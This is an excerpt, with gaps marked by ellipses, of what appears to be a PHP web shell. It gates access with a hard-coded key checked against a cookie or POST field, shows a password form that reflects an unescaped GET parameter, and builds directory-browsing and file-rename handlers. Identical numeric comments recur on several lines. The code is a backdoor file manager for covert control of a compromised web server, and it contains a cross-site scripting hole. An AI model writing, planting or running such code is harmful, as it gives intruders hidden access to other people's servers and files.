...
$auth_key = "df844cbdde5560eb5b0e28f87b604ddd";
...
$pass = false;
if (isset($_COOKIE['pw_name_51532'])) {
    if(($_COOKIE['pw_name_51532']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_51532'])) {
        if(($_POST['pw_name_51532']) == $auth_key) {
            setcookie("pw_name_51532", $_POST['pw_name_51532']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_51532' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720690856216172 1720690856656842 1720690856503439 1720690856333447
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720690856216172 1720690856656842 1720690856503439 1720690856333447
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720690856216172 1720690856656842 1720690856503439 1720690856333447
            $name = PATH . "/" . $_GET['r'];
